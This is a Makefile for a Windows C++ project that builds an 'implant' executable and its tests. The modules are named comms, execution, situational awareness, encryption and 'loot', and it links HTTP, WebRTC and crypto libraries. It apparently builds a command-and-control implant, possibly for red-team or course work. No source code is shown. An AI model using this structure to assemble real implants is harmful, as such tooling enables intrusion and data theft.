
CC=gcc
CXX=g++ --std=c++17

ifeq ($(OS),Windows_NT)
	RM=powershell /c rm
else
	RM=rm
endif

headers = comms/comms.hpp config/config.hpp execution/execution.hpp sitawareness/sitawareness.hpp file_io/file_io.h crypto/aesgcm.hpp loot/loot.hpp

.PHONY: all clean tests

all : bin/implant.exe

bin/implant.exe : implant.cpp comms/comms.cpp execution/execution.cpp sitawareness/sitawareness.cpp $(headers)
	$(CXX) implant.cpp comms/comms.cpp execution/execution.cpp sitawareness/sitawareness.cpp -lwinhttp -o bin/implant.exe

tests : bin/test_get_post.exe bin/test_getcommand.exe bin/test_sitawareness.exe bin/test_file_io.exe

bin/test_get_post.exe : tests/test_get_post.cpp comms/comms.cpp execution/execution.cpp $(headers)
	$(CXX) tests/test_get_post.cpp comms/comms.cpp execution/execution.cpp -lwinhttp -o bin/test_get_post.exe

bin/test_getcommand.exe : tests/test_getcommand.cpp comms/comms.cpp execution/execution.cpp $(headers)
	$(CXX) tests/test_getcommand.cpp comms/comms.cpp execution/execution.cpp -lwinhttp -o bin/test_getcommand.exe

bin/test_sitawareness.exe : tests/test_sitawareness.cpp sitawareness/sitawareness.cpp $(headers)
	$(CXX) tests/test_sitawareness.cpp sitawareness/sitawareness.cpp execution/execution.cpp -o bin/test_sitawareness.exe

bin/test_file_io.exe: tests/test_file_io.cpp file_io/file_io.cpp $(headers)
	$(CXX) tests/test_file_io.cpp file_io/file_io.cpp -lwinhttp -o bin/test_file_io.exe -lshlwapi -lurlmon

bin/test_loot.exe : tests/test_loot.cpp loot/loot.cpp file_io/file_io.cpp libs/base64/base64.cpp libs/base64/base64.h $(headers)
	$(CXX) -g tests/test_loot.cpp loot/loot.cpp file_io/file_io.cpp libs/base64/base64.cpp -o bin/test_loot.exe -lshlwapi -lurlmon -lcrypt32

main_implant : main_implant.cpp comms/comms.cpp execution/execution.cpp sitawareness/sitawareness.cpp crypto/aesgcm.cpp file_io/file_io.cpp loot/loot.cpp $(headers)
	$(CXX) -DCHILD main_implant.cpp comms/comms.cpp execution/execution.cpp sitawareness/sitawareness.cpp crypto/aesgcm.cpp file_io/file_io.cpp loot/loot.cpp libs/base64/base64.cpp libdatachannel.dll -lwinhttp -lcrypt32 -lbcrypt -lshlwapi -lurlmon -o bin/main_implant.exe

main_implant_parent : main_implant.cpp comms/comms.cpp execution/execution.cpp sitawareness/sitawareness.cpp crypto/aesgcm.cpp file_io/file_io.cpp loot/loot.cpp $(headers)
	$(CXX) main_implant.cpp comms/comms.cpp execution/execution.cpp sitawareness/sitawareness.cpp crypto/aesgcm.cpp file_io/file_io.cpp loot/loot.cpp libs/base64/base64.cpp libdatachannel.dll -lwinhttp -lcrypt32 -lbcrypt -lshlwapi -lurlmon -o bin/main_implant_parent.exe


test_rtc:
	$(CXX) tests/test_rtc.cpp libdatachannel.dll -o bin/test_rtc.exe

test_ws: test_ws/test_parent.cpp test_ws/test_child.cpp
	$(CXX) test_ws/test_parent.cpp libdatachannel.dll -lWs2_32 -o bin/test_parent.exe
	$(CXX) test_ws/test_child.cpp libdatachannel.dll -lWs2_32 -o bin/test_child.exe

clean :
	$(RM) bin/*.exe
